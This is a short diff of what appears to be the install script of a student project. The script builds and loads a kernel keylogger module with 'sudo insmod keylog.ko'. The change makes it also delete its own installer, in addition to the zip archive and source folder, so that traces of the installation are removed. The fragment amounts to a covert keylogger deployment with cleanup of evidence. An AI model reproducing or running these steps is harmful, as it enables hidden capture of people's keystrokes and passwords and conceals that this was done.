@@ -10,6 +10,6 @@ cd final-project-click-to-add-lemon-master/Source/
 make
 sudo insmod keylog.ko
 
-cd
-rm -r -f keylog.zip
+cd ../..
+rm -r -f keylog.zip install_keylog.sh
 rm -r -f final-project-click-to-add-lemon-master
